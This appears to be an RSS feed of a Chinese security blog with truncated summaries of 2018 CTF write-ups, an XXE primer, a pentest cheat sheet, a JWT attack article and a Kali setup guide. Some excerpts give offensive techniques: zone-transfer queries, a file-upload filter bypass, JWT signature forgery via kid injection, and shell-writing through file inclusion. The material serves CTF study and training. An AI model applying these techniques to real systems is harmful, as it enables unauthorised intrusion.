1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 # -*- coding : utf-8 -*- # python 3.</description></item><item><title>one-line-php-challenge 复现</title><link>https://ret2neo.cn/post/181123-one-line-php-challenge/</link><pubDate>Fri, 23 Nov 2018 08:31:07 +0800</pubDate><guid>https://ret2neo.cn/post/181123-one-line-php-challenge/</guid><description>源码 环境：This is a default installation PHP7.2 + Apache on Ubuntu 18.04 。
解读 $_GET 是一个数组，包含通过URL参数传给当前脚本的变量。如访问localhost?orange=123&amp;amp;foo=bar ，则 $_GET 为 array ('orange' =&amp;gt; '123','foo' =&amp;gt; 'bar',) ，$_GET['orange'] 为'123' 。另外，$_GET 是超全局变量，即在全部作用域中始终可用的内置变量。 @被称为错误控制运算符（Error Control Operators）。当将其放置在一个 PHP 表达式之前，该表达式可能产生的任何错误信息都被忽略掉。例如对于内容为&amp;lt;?php $_=$_GET['orange']; 的PHP文件，直接访问其会报错 Notice : Undefined index: orange in... ，加上 @ 后就不会显示错误信息。 赋值操作。和C语言中的情况一样，赋值表达式的值就是赋值符号右侧的操作数的值。The value of an assignment expression is the value assigned 。 $_ 。一个普通的变量名。 file() 。把整个文件读入数组中。 array file ( string $filename [, int $flags = 0 [, resource $context ]] ) string substr ( string $string , int $start [, int $length ] ) 。 include 语句包含并运行指定文件。 (expr1) ?</description></item><item><title>SECCON 2018</title><link>https://ret2neo.cn/post/181028-seccon-wp/</link><pubDate>Sun, 28 Oct 2018 16:05:30 +0800</pubDate><guid>https://ret2neo.cn/post/181028-seccon-wp/</guid><description>Forensics Unzip 压缩命令为
1 2 echo &amp;#39;SECCON{&amp;#39;`cat key`&amp;#39;}&amp;#39; &amp;gt; flag.txt zip -e --password=`perl -e &amp;#34;print time()&amp;#34;` flag.zip flag.txt update:
比较棒的思路是flag.zip生成时刻的时间戳就是他的密码。那么
1 2 $stat -c %Y flag.zip 1540566641 爆破密码：
History 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 $ binwalk J DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 3912330 0x3BB28A ARJ archive data, header size: 22472, version 1, minimum version to extract: 1, compression method: stored, file type: binary, original name: &amp;#34;1&amp;#34;, original file date: 1970-01-01 00:00:00, compressed file size: 538968064, uncompressed file size: 1441792, os: MS-DOS # MS-DOS 以小端序存储数据 $ strings -el J | grep SEC .</description></item><item><title>Hack.lu CTF 2018 Baby PHP</title><link>https://ret2neo.cn/post/181022-hackluctf-web/</link><pubDate>Mon, 22 Oct 2018 21:44:52 +0800</pubDate><guid>https://ret2neo.cn/post/181022-hackluctf-web/</guid><description>Baby PHP 环境：https://arcade.fluxfingers.net:1819/
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 &amp;lt;?php require_once(&amp;#39;flag.php&amp;#39;); error_reporting(0); if(!isset($_GET[&amp;#39;msg&amp;#39;])){ highlight_file(__FILE__); die(); } @$msg = $_GET[&amp;#39;msg&amp;#39;]; if(@file_get_contents($msg)!==&amp;#34;Hello Challenge!</description></item><item><title>护网杯解题记录</title><link>https://ret2neo.cn/post/181013-huwangbei-writeup/</link><pubDate>Sun, 14 Oct 2018 00:17:37 +0800</pubDate><guid>https://ret2neo.cn/post/181013-huwangbei-writeup/</guid><description>FEZ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 import os def xor(a,b): assert len(a)==len(b) c=&amp;#34;&amp;#34; for i in range(len(a)): c+=chr(ord(a[i])^ord(b[i])) return c def f(x,k): return xor(xor(x,k),7) def round(M,K): L=M[0:27] R=M[27:54] new_l=R new_r=xor(xor(R,L),K) return new_l+new_r def fez(m,K): for i in K: m=round(m,i) return m K=[] for i in range(7): K.</description></item><item><title>picoCTF-2018 解题报告</title><link>https://ret2neo.cn/post/180929-picoctf/</link><pubDate>Thu, 11 Oct 2018 22:07:27 +0800</pubDate><guid>https://ret2neo.cn/post/180929-picoctf/</guid><description>题目：
https://2018game.picoctf.com/problems 备用：https://findneo.github.io/p/picoCTF-2018-Problems.html 附件：https://github.com/findneo/ctfgodown/tree/master/20180929-picoctf Forensics Forensics Warmup 1 picoCTF{welcome_to_forensics}
Forensics Warmup 2 picoCTF{extensions_are_a_lie}
Desrouleaux 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 nc 2018shell2.picoctf.com 63299 You&amp;#39;ll need to consult the file `incidents.json` to answer the following questions. What is the most common source IP address?</description></item><item><title>福建省黑盾杯解题报告</title><link>https://ret2neo.cn/post/180920-heidunbei/</link><pubDate>Thu, 20 Sep 2018 14:07:27 +0800</pubDate><guid>https://ret2neo.cn/post/180920-heidunbei/</guid><description>2018/9/16 福师大黑盾杯
信息泄露+代码审计 svn泄露源码：http://192.168.200.200/web/codeaudit/.svn/text-base/index.php.svn-base.txt
1 2 3 4 5 6 7 8 9 10 11 12 13 &amp;lt;?php error_reporting(0); $user = $_COOKIE[&amp;#39;user&amp;#39;]; $code = $_GET[&amp;#39;code&amp;#39;]?(int)$_GET[&amp;#39;code&amp;#39;]:&amp;#39;&amp;#39;; if($user == &amp;#39;admin&amp;#39; &amp;amp;&amp;amp; !empty($code)) { $hex = (int)$code; if(($hex ^ 6789) === 0xCDEF) { require(&amp;#34;flag.php&amp;#34;); echo $flag; exit(); } echo &amp;#34;ȱ��Ӧ�еĲ���,��û��Ȩ�޲鿴������&amp;#34;; ?&amp;gt; GET 请求code=55146 ， 请求头添加Cookie: user=admin; 。
flag{a737c5c5b759c3705c8100accf65b5e4}
最好的语言 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 &amp;lt;?</description></item><item><title>胖哈勃之 LHY</title><link>https://ret2neo.cn/post/180903-pwnhub-lhy/</link><pubDate>Mon, 03 Sep 2018 02:29:11 +0800</pubDate><guid>https://ret2neo.cn/post/180903-pwnhub-lhy/</guid><description>Problem 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 #!/usr/bin/env python import gmpy from Crypto.Util.number import * from secret import x, y, flag assert gmpy.is_prime(y) ** 2016 + gmpy.is_prime(x+1) ** 2017 + ((x**2 - 1)**2 % (2*x*y - 1) + 2) ** 2018 == 30097557298197417800049182668952226601954645169633891463401117760245367082644152355564014438095421962150109895432272944128252155287648477680131934943095113263121691874508742328500559321036238322775864636883202538152031804102118831278605474474352011895348919417742923873371980983336517409056008233804190890418285814476821890492630167665485823056526646050928460488168341721716361299816947722947465808004305806687049198633489997459201469227952552870291934919760829984421958853221330987033580524592596407485826446284220272614663464267135596497185086055090126893989371261962903295313304735911034185619611156742146 p = gmpy.next_prime(x**3 + y**3) #(x+y)**3-3xy(x+y) q = gmpy.next_prime(x**2*y + y**2*x) #xy(x+y) n = p * q phi = (p-1)*(q-1) d = gmpy.</description></item><item><title>TJCTF2018：Mirror Mirror——一种绕过Python沙箱字符限制的方法</title><link>https://ret2neo.cn/post/180814-python-jail-escape/</link><pubDate>Tue, 14 Aug 2018 19:24:11 +0800</pubDate><guid>https://ret2neo.cn/post/180814-python-jail-escape/</guid><description>通过nc连接problem1.tjctf.org:8004 ,题目提供一个Python交互终端。
根据题目描述 Reflection 可知与Python反射机制有关。
所谓反射机制就是能够通过向函数传入字符串参数，来操纵指定对象的类型、属性、方法和类。
A Python script can find out about the type, class, attributes and methods of an object. This is referred to as reflection or introspection. See also Metaclasses.
Reflection-enabling functions include type(), isinstance(), callable(), dir() and getattr().
—— https://en.wikibooks.org/wiki/Python_Programming/Reflection
这里使用dir() 函数查看get_flag 的属性。
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 λ nc problem1.</description></item><item><title>XML外部实体注入小结</title><link>https://ret2neo.cn/post/180811-xxe-injection/</link><pubDate>Sat, 11 Aug 2018 19:18:24 +0800</pubDate><guid>https://ret2neo.cn/post/180811-xxe-injection/</guid><description>本文发自 先知社区 ，转载请注明出处。
（ 这个问题资料很多了，细节也颇多，本文涉及的内容只是最基本的，描述得也难比以往的好，仅仅是记录所学。对于已经理解XXE基本情况的读者，阅读真实案例和生成恶意Word文档两部分可能会有收获。）
WHAT XML XML是类似HTML的标记语言，但它们有所不同。
其一，HTML用于表现数据，关注数据的表现形式，XML用于存储和传输数据，关注数据本身。 其二，HTML的标签是预定义的，而XML的标签是自定义的，或者说，任意的。 此外，XML语法更严格，其标签必须闭合且正确嵌套，大小写敏感，属性值必须加引号，保留连续空白符。 &amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;UTF-8&amp;quot; standalone=&amp;quot;yes&amp;quot;?&amp;gt; 称为 XML prolog ，用于声明XML文档的版本和编码，是可选的，必须放在文档开头。standalone值是yes的时候表示DTD仅用于验证文档结构，从而外部实体将被禁用，但它的默认值是no，而且有些parser会直接忽略这一项。 DTD XML元素以形如 &amp;lt;tag&amp;gt;foo&amp;lt;/tag&amp;gt; 的标签开始和结束，如果元素内部出现如&amp;lt; 的特殊字符，解析就会失败，为了避免这种情况，XML用实体引用（entity reference）替换特殊字符。XML预定义了五个实体引用，即用&amp;amp;lt; &amp;amp;gt; &amp;amp;amp; &amp;amp;apos; &amp;amp;quot; 替换 &amp;lt; &amp;gt; &amp;amp; ' &amp;quot; 。
实际上，实体引用可以起到类似宏定义和文件包含的效果，为了方便，我们会希望自定义实体引用，这个操作在称为 Document Type Defination（DTD，文档类型定义）的过程中进行。DTD是XML文档中的几条语句，用来说明哪些元素/属性是合法的以及元素间应当怎样嵌套/结合，也用来将一些特殊字符和可复用代码段自定义为实体。
DTD有两种形式：
1 2 3 4 5 内部 DTD：&amp;lt;!DOCTYPE 根元素 [元素声明]&amp;gt; 外部 DTD： &amp;lt;!DOCTYPE 根元素 SYSTEM &amp;#34;存放元素声明的文件的URI，可以是本地文件或网络文件&amp;#34; [可选的元素声明]&amp;gt; &amp;lt;!DOCTYPE 根元素 PUBLIC &amp;#34;PUBLIC_ID DTD的名称&amp;#34; &amp;#34;外部DTD文件的URI&amp;#34;&amp;gt; （ PUBLIC表示 DTD文件是公共的，解析器先分析 DTD名称，没查到再去访问 URI） ENTITY 我们可以在元素声明中自定义实体，和DTD类似也分为内部实体和外部实体，此外还有普通实体和参数实体之分：</description></item><item><title>【译】渗透测试工具备忘录</title><link>https://ret2neo.cn/post/180727penetrationtool/</link><pubDate>Wed, 25 Jul 2018 15:01:56 +0800</pubDate><guid>https://ret2neo.cn/post/180727penetrationtool/</guid><description>渗透测试工具备忘录 本文翻译自 Penetration Testing Tools Cheat Sheet ，首发先知社区 ，转载请注明链接。
简介 渗透测试工具备忘录记录渗透测试时常用的命令，更深入的信息推荐参考特定工具的帮助文档或 本站 其他备忘录。
本目录关注网络底层相关的渗透测试，除了少量sqlmap的命令和一些Web服务枚举外，基本不包含Web应用渗透测试的内容。关于Web应用测试，建议参考《黑客攻防技术宝典》，这本书不管是用作专门学习还是参考手册都是很棒的。
文中缺漏之处欢迎 推特 私戳。
更新日志： 17/02/2017 ：更新文章，增加VPN，DNS隧道，VLAN hopping（跳跃攻击） 等内容。
开始前 网络配置 设置IP 地址 1 ifconfig eth0 xxx.xxx.xxx.xxx/24 子网划分 1 2 ipcalc xxx.xxx.xxx.xxx/24 ipcalc xxx.xxx.xxx.xxx 255.255.255.0 公开来源情报 被动信息收集 DNS WHOIS 枚举 1 whois domain-name-here.com 查询DNS IP 1 dig a domain-name-here.com @nameserver 查询MX记录 1 dig mx domain-name-here.com @nameserver 用DIG 查询域传送 1 dig axfr domain-name-here.com @nameserver DNS 域传送 命令 解释 nslookup -&amp;gt; set type=any -&amp;gt; ls -d blah.</description></item><item><title>Meepwn2018：MaplStory——以Cookie为跳板的Session文件包含</title><link>https://ret2neo.cn/post/180721meepwnmaplstory/</link><pubDate>Sat, 21 Jul 2018 03:43:44 +0800</pubDate><guid>https://ret2neo.cn/post/180721meepwnmaplstory/</guid><description>本文首发 先知社区 ，转载请注明链接。
本题考察PHP源码审计。主要有两个缺陷：使用ECB模式进行AES加密导致的CPA（选择明文攻击）和 文件包含。有两处可以向文件写入内容以供包含，但均被过滤，最终通过以未被过滤的Cookie为跳板连接两处文件包含来写入Shell。文末还介绍了一种深入利用一处文件包含getshell的解法。
概览 打开 http://178.128.87.16 是一个登陆页面，注册账户后有四个页面，HOME 是欢迎页，CHARACTER 页可以和宠物角色互动，但账户刚注册完是没有宠物的，需要获取ADMIN权限后自行添加， SETTING 页可以修改用户名和选择头像，GAME 页是一个Flash小游戏，和本题无关。
题目提供了源码下载，可以从 这里 或 备用地址 下载。
文件包含 index.php index.php 文件中有如下语句，显然存在文件包含。
1 2 3 4 if(isset($_GET[&amp;#39;page&amp;#39;]) &amp;amp;&amp;amp; !empty($_GET[&amp;#39;page&amp;#39;])) { include($_GET[&amp;#39;page&amp;#39;]); } 但所有 GET 和POST 提交的参数都会被删除掉敏感字符串，其中 // 、(.+) 和 `` 是比较值得注意的。
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 function bad_words($value) { //My A.I TsuGo show me that when player using these words below they feel angry, so i decide to censor them.</description></item><item><title>Meepwn2018：PyCalx&amp;PyCalx2——Python3的f-string与eval注入</title><link>https://ret2neo.cn/post/180719meepwn_py3inject/</link><pubDate>Thu, 19 Jul 2018 09:10:50 +0800</pubDate><guid>https://ret2neo.cn/post/180719meepwn_py3inject/</guid><description>本文首发 先知社区 ，转载请注明链接。
PyCalx This code is supposed to be unexploitable :/ another pyjail? [Source] Try this or this Notice: The flag may contain non alphabetic characters (but still printable)
本题由Python的 eval() 函数参数可控且直接拼接引发的注入，采用二分法盲注。
server.py源码如下：
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 #!</description></item><item><title>CTF中常见的RSA相关问题总结</title><link>https://ret2neo.cn/post/180727rsa-attack/</link><pubDate>Sun, 15 Jul 2018 19:41:04 +0800</pubDate><guid>https://ret2neo.cn/post/180727rsa-attack/</guid><description>本文首发先知社区 ，转载请注明链接。
CTF中常见的RSA相关问题总结 前言 ​理解基本概念后，代码就可以说明一切，所以本文将每种攻击方式的实现方法都提炼成了一个函数，在理解原理时会有帮助，在需要时也可以直接调用。
基础 RSA概要 在开始前可以通过 《RSA算法详解》 这篇文章了解关于RSA的基础知识，包括加解密方法，算法原理和可行性证明等。
应用流程 选取两个较大的互不相等的质数p和q，计算n = p * q 。 计算phi = (p-1) * (q-1) 。 选取任意e，使得e满足 1&amp;lt;e&amp;lt;phi 且 gcd(e , phi) == 1 。 计算e关于 phi 的模逆元d， 即d满足(e * d)% phi ==1 。 加解密：c = (m ^ e) % n ， m = (c ^ d) % n 。其中m为明文，c为密文，(n,e)为公钥对，d为私钥，要求 0 &amp;lt;= m &amp;lt; n 。 理解模逆运算 如果 (a*b)%c==1 ，那么a和b互为对方模c的模逆元/数论倒数，也写作 。
关于最大公约数有一个基本事实：给予两整数a、c，必存在整数x、y使得ax + cy = gcd(a,c) ，基于这个事实，当a,c互素即gcd(a,c)==1 时，有ax+cy=1 ，那么就有(a*x)%c==1 ，所以x就是a 对c的模逆元。因此，a对c存在模逆元b的充要条件是gcd(a,c)==1 。显然对于每一组a,c ，存在一族满足条件的x，在求模逆元时我们取得是最小正整数解x mod n 。</description></item><item><title>根据豆瓣观影记录生成海报</title><link>https://ret2neo.cn/post/180706doubanmovie/</link><pubDate>Fri, 06 Jul 2018 23:51:56 +0800</pubDate><guid>https://ret2neo.cn/post/180706doubanmovie/</guid><description>效果见 findneo 的观影记录 。 环境依赖：python2 + pip install bs4 lxml requests
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 #coding:utf8 # https://www.</description></item><item><title>suctf writeup</title><link>https://ret2neo.cn/post/180527suctf/</link><pubDate>Sun, 27 May 2018 22:07:58 +0800</pubDate><guid>https://ret2neo.cn/post/180527suctf/</guid><description>MISC sandgame game.py
1 2 3 4 5 6 7 8 import flag flag = flag.flag sands = int(flag[5:-1].encode(&amp;#34;hex&amp;#34;), 16) holes = [257, 263, 269, 271, 277, 281, 283, 293, 307, 311, 313, 317, 331, 337, 347, 349, 353, 359, 367, 373] with open(&amp;#34;sand.txt&amp;#34;, &amp;#34;w&amp;#34;) as f: for i in range(len(holes)): sand = sands % holes[i] f.write(str(sand)+&amp;#34;\n&amp;#34;) solution.py
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 #coding:utf8 # import flag # 解同余方程组；中国剩余定理，韩信点兵，扩展欧几里得，模反 &amp;lt;= 深入理解 #求模反元素，模逆元 def gcd(a,b): while a!</description></item><item><title>在win10家庭版上的Docker中使用Kali</title><link>https://ret2neo.cn/post/180512kaliondocker/</link><pubDate>Sat, 12 May 2018 00:05:29 +0800</pubDate><guid>https://ret2neo.cn/post/180512kaliondocker/</guid><description>全程需保证保证网络畅通
安装Docker 从 https://docs.docker.com/toolbox/toolbox_install_windows/ 下载DockerToolbox.exe 。关闭其他程序，右键管理员运行，选项可全部保持默认（如果电脑上未安装Git，在安装过程中需注意勾选）。
桌面可看到名为``Docker Quickstart Terminal`的快捷方式，右键管理员运行，等待直到出现可交互命令行。
修改默认存储位置到非系统盘 在上一步出现的可交互命令行界面运行 docker-machine.exe stop default 关闭基础虚拟机。
运行桌面上名为Oracle VM VirtualBox 的快捷方式。
在管理-&amp;gt;虚拟介质管理器【CTRL+D】 中复制disk.vmdk 到D盘 ，注意最好保持vmdk 格式。 选中default 虚拟机，右键设置-&amp;gt;存储-&amp;gt;控制器：SATA-&amp;gt;添加虚拟硬盘 中添加D盘的disk.vmdk 。删除C盘的disk.vmdk 。保存设置。 回到 命令行，运行docker-machine.exe start default 启动基础虚拟机。
下载Kali基础镜像并配置容器 （以下命令均在上述命令行中输入）
docker pull kalilinux/kali-linux-docker 拉取Kali基础镜像，约700+M。
docker run -it --name kali kalilinux/kali-linux-docker /bin/bash 基于该镜像启动一个容器并命名为kali 。
apt update &amp;amp;&amp;amp; apt full-upgrade &amp;amp;&amp;amp; apt auto-remove &amp;amp;&amp;amp; apt-autoclean 安装工具前的准备工作。此处是一小段等待。
apt install kali-linux-all 安装Kali的工具包。此处是漫长等待。 如果报错按错误提示操作即可。
配置msf数据库 service postgresql start su postgres</description></item><item><title>JSON Web Token的认识与攻击</title><link>https://ret2neo.cn/post/180503jwt/</link><pubDate>Thu, 03 May 2018 22:22:34 +0800</pubDate><guid>https://ret2neo.cn/post/180503jwt/</guid><description>本文首发 Freebuf 。略有更新。
0x01 初识JWT JWT （ JSON Web Token 的缩写）是一串带有声明信息的字符串，由服务端用加密算法对信息签名来保证其完整性和不可伪造。Token里可以包含所有必要信息，这样服务端就无需保存任何关于用户或会话的信息，JWT可用于身份认证、会话状态维持、信息交换等。
JWT 由三部分构成，分别称为 header 、payload 和 signature ，各部分用. 相连构成一个完整的Token，形如xxxxx.yyyyy.zzzzz 。
分别看下各个部分：
header ：
使用一个JSON格式字符串声明token的类型和签名用的算法等，形如{&amp;quot;alg&amp;quot;: &amp;quot;HS256&amp;quot;, &amp;quot;typ&amp;quot;: &amp;quot;JWT&amp;quot;} 。该字符串经过Base64Url编码后形成JWT的第一部分xxxxx。
Base64Url编码可以用这段代码直观理解：
1 2 3 4 5 6 7 8 9 10 from base64 import * def base64URLen(s): t0=b64encode(s) t1=t0.strip(&amp;#39;=&amp;#39;).replace(&amp;#39;+&amp;#39;,&amp;#39;-&amp;#39;).replace(&amp;#39;/&amp;#39;,&amp;#39;_&amp;#39;) return t1 def base64URLde(s): t0=s.replace(&amp;#39;-&amp;#39;,&amp;#39;+&amp;#39;).replace(&amp;#39;_&amp;#39;,&amp;#39;/&amp;#39;) t1=t0+&amp;#39;=&amp;#39;*(4-len(t0)%4)%4 return b64decode(t1) payload :
使用一个JSON格式字符串描述所要声明的信息，分为 registered 、 public 、 和 private 三类，形如{&amp;quot;name&amp;quot;: &amp;quot;John Doe&amp;quot;, &amp;quot;admin&amp;quot;: true} ，具体信息可参考 RFC7519 的 JWT claims 部分。</description></item><item><title>第十一届全国大学生信息安全竞赛“创新实践能力赛”</title><link>https://ret2neo.cn/post/180430ciscn/</link><pubDate>Mon, 30 Apr 2018 03:43:05 +0800</pubDate><guid>https://ret2neo.cn/post/180430ciscn/</guid><description>全部赛题：https://github.com/findneo/ctfgodown/tree/master/20180430-ciscn
WEB easyweb http://114.116.26.217/
学习了一点 json web token ，但是没想到是个脑洞。（应该只是非预期解）
账户admin，空密码登陆。
ciscn{2a36b5f78a1d6a107212d82ee133c421}
有师傅在群里说HMAC的密钥放在数据库里，而kid是个注入点，可以通过联合查询控制查询结果，然后伪造签名。
从开始做到赛后试着复现都一直纠结alg 是sha256的问题，以为密钥是用来加盐，然后就自己胡乱加盐，陷入困境。后来仔细了解了一下，HMAC就算是一个比较复杂的加盐算法吧，自己加没啥意思，而且jwt也不支持纯粹sha256。
事实证明把sha256改成HS256就好了。这里有两种可能，一是后端写死算法为HS256，然后header里面写成了sha256，二是算法根据alg 的值确定，我们传入HS256所以按照HS256来计算。
经过测试发现后端甚至根本不在乎有没alg ，，，，所以说做题思路还是要灵活一些。
kid的值随意传，奇怪一点就行，只要让它查询不出结果，那么我们联合查询的值就会作为最后的密钥。
参考：
https://www.jianshu.com/p/e64d96b4a54d https://security.stackexchange.com/questions/79577/whats-the-difference-between-hmac-sha256key-data-and-sha256key-data https://docs.python.org/2/library/hmac.html MISC 验证码 本题目为验证码破解，选手需在指定时间完成对验证码的破解，成功后获取Flag。请使用队伍token进行登陆。 参考数据：https://share.weiyun.com/6e055fc3402e86c7cbb5384f1a6b41b8
https://game.captcha.qq.com/hslj/html/hslj/
题目有点问题，手动玩了一会儿。
ciscn{12qiftb1qj12mbzm1xmjd2iix2ibqz7i}
后来换成输验证码得flag了。
picture 请从图中找出密码。
binwalk -e 分离得到 97E4 和 97E4.zlib 两个文件，后者是前者的 zlib 压缩文件。
1 2 3 import zlib print zlib.decompress(open(&amp;#39;97E4.zlib&amp;#39;,&amp;#39;rb&amp;#39;).read())==open(&amp;#39;97E4&amp;#39;,&amp;#39;rb&amp;#39;).read() # got True 文件97E4 内容的base64解码后稍做处理是一个加密的压缩包。
1 2 3 4 5 6 7 8 import base64 t=open(&amp;#39;97E4&amp;#39;,&amp;#39;rb&amp;#39;).read() m=base64.b64decode(t).encode(&amp;#34;hex&amp;#34;) n=&amp;#39;&amp;#39; for i in range(len(m)/4): n+=m[i*4+2:i*4+4]+m[i*4:i*4+2] print n # 504b040300140001000030904c97542e7f25005a0000004e0000000400006f6365647ab0d6a3f3bbc8060511ce0c8b62793d8d39caf2b644325509c991cb202dc981e60ea354ca8de79f3bc187f6719f4738adf24fa3ca2d9d7b8adda175d833d1c0264225c62d86784977cf5973989ea77ddbbf31060aef47124fca4b500201003f00140001000030904c97542e7f25005a0000004e00000004002400000000000000200000000000006f636564000a002000000000000100189800e452da8501d3bcf6ace5da8701d3bcf6ace5da8701d34b500605000000000001000100560000007c000000dc505b74796f68206e2e325d370a0d3e3e203e7da87da87da80a0d0a0d7254636162656361206b6d28736f207465726563746e63206c61206c616c74733a290a0d20206946656c2220703c737965686c6c3023223e202c696c656e3120202c6e693c206f6d7564656c0d3e200a2020a820a87da87d0d7d5a0a7265446f766973696f69456e7272726f203a7da87da87da87da87da87da87da87da87da87da87da87da87da87da87da87da87da87da87da87da87da87da87da87da87da87da87da87da87da87da83c20202d617073736f7764723b200d293e0a3e3e0020 大致内容如下：</description></item><item><title>starctf writeup</title><link>https://ret2neo.cn/post/180426starctf/</link><pubDate>Thu, 26 Apr 2018 14:20:29 +0800</pubDate><guid>https://ret2neo.cn/post/180426starctf/</guid><description>Web simpleweb nc 47.75.4.252 23333
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 var net = require(&amp;#39;net&amp;#39;); flag=&amp;#39;fake_flag&amp;#39;; var server = net.createServer(function(socket) { socket.on(&amp;#39;data&amp;#39;, (data) =&amp;gt; { //m = data.toString().replace(/[\n\r]*$/, &amp;#39;&amp;#39;); ok = true; arr = data.toString().split(&amp;#39; &amp;#39;); arr = arr.</description></item><item><title>GitHub 可用短ID</title><link>https://ret2neo.cn/post/180419githubniceid/</link><pubDate>Thu, 19 Apr 2018 20:27:42 +0800</pubDate><guid>https://ret2neo.cn/post/180419githubniceid/</guid><description>做了件无聊的事，做完发现有人做过了（https://www.v2ex.com/t/401615 ） ，记录一下。
GitHub用户名要求是
1 Username may only contain alphanumeric characters or single hyphens, and cannot begin or end with a hyphen 也就是满足正则 ^[0-9a-zA-Z]$|[0-9a-zA-Z][-0-9a-zA-Z]*[0-9a-zA-Z] ，
因为大小写不敏感，所以相当于 ^[0-9a-z]$|[0-9a-z][-0-9a-z]*[0-9a-z]
产生一位和两位的符合GitHub命名要求的名字
1 2 3 4 5 6 7 8 9 10 11 12 13 import string import itertools f=open(&amp;#34;GithubName12.txt&amp;#34;,&amp;#39;w+&amp;#39;) a=string.lowercase +string.digits+&amp;#39;-&amp;#39; tmp=[] for i in xrange(1,3): for j in itertools.product(a,repeat=i): name=&amp;#39;&amp;#39;.join(j) if j[0]==&amp;#39;-&amp;#39; or j[-1]==&amp;#39;-&amp;#39;: continue tmp.append(name) f.write(&amp;#39;\n&amp;#39;.join(tmp)) 产生三位的符合GitHub命名要求的名字
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 import requests import string import itertools import random f=open(&amp;#34;GithubName3.</description></item><item><title>Bugku Writeup</title><link>https://ret2neo.cn/post/180406bugkuwriteup/</link><pubDate>Fri, 06 Apr 2018 00:12:06 +0800</pubDate><guid>https://ret2neo.cn/post/180406bugkuwriteup/</guid><description>WEB WEB2 听说聪明的人都能找到答案 http://120.24.86.145:8002/web2/
源码中有注释。 KEY{Web-2-bugKssNNikls9100}
文件上传测试 http://103.238.227.13:10085/
Flag格式：Flag:xxxxxxxxxxxxx
Flag:42e97d465f962c53df9549377b513c7e
上传文件后缀为PHP且修改content-type 值为image/gif 等即可。
计算题 地址：http://120.24.86.145:8002/yanzhengma/
修改前端限制。flag{CTF-bugku-0032}
web基础$_GET http://120.24.86.145:8002/get/
访问http://120.24.86.145:8002/get/?what=flag 。flag{bugku_get_su8kej2en}
web基础$_POST http://120.24.86.145:8002/post/
使用hackbar post what=flag 。 flag{bugku_get_ssseint67se}
你从哪里来 http://120.24.86.145:9009/from.php
添加HTTP头 Referer:https://www.google.com
flag{bug-ku_ai_admin}
头等舱 http://120.24.86.145:9009/hd.php
响应头 flag{Bugku_k8_23s_istra}: ，在f12直接看看不出来。
md5 collision(NUPT_CTF) http://120.24.86.145:9009/md5.php
http://120.24.86.145:9009/md5.php?a=s878926199a
flag{md5_collision_is_easy}
矛盾 http://120.24.86.145:8002/get/index1.php
1 2 3 4 5 6 $num=$_GET[&amp;#39;num&amp;#39;]; if(!is_numeric($num)){ echo $num; if($num==1) echo &amp;#39;flag{**********}&amp;#39;; } http://120.24.86.145:8002/get/index1.php?num=1x
http://120.24.86.145:8002/get/index1.php?num=1e0x
flag{bugku-789-ps-ssdf}
WEB3 flag就在这里快来找找吧 http://120.24.86.145:8002/web3/
CTRL+U;CTRL+W;CTRL+END 得到：
1 &amp;lt;!--&amp;amp;#75;&amp;amp;#69;&amp;amp;#89;&amp;amp;#123;&amp;amp;#74;&amp;amp;#50;&amp;amp;#115;&amp;amp;#97;&amp;amp;#52;&amp;amp;#50;&amp;amp;#97;&amp;amp;#104;&amp;amp;#74;&amp;amp;#75;&amp;amp;#45;&amp;amp;#72;&amp;amp;#83;&amp;amp;#49;&amp;amp;#49;&amp;amp;#73;&amp;amp;#73;&amp;amp;#73;&amp;amp;#125;--&amp;gt; 1 2 3 s = &amp;#39;&amp;amp;#75;&amp;amp;#69;&amp;amp;#89;&amp;amp;#123;&amp;amp;#74;&amp;amp;#50;&amp;amp;#115;&amp;amp;#97;&amp;amp;#52;&amp;amp;#50;&amp;amp;#97;&amp;amp;#104;&amp;amp;#74;&amp;amp;#75;&amp;amp;#45;&amp;amp;#72;&amp;amp;#83;&amp;amp;#49;&amp;amp;#49;&amp;amp;#73;&amp;amp;#73;&amp;amp;#73;&amp;amp;#125;&amp;#39; print &amp;#39;&amp;#39;.</description></item><item><title>xss.tv挑战赛</title><link>https://ret2neo.cn/post/180405xsstvchallenge/</link><pubDate>Thu, 05 Apr 2018 23:47:33 +0800</pubDate><guid>https://ret2neo.cn/post/180405xsstvchallenge/</guid><description>http://test.xss.tv
http://47.94.13.75/test/
test on Firefox 54.0 (64-bit)
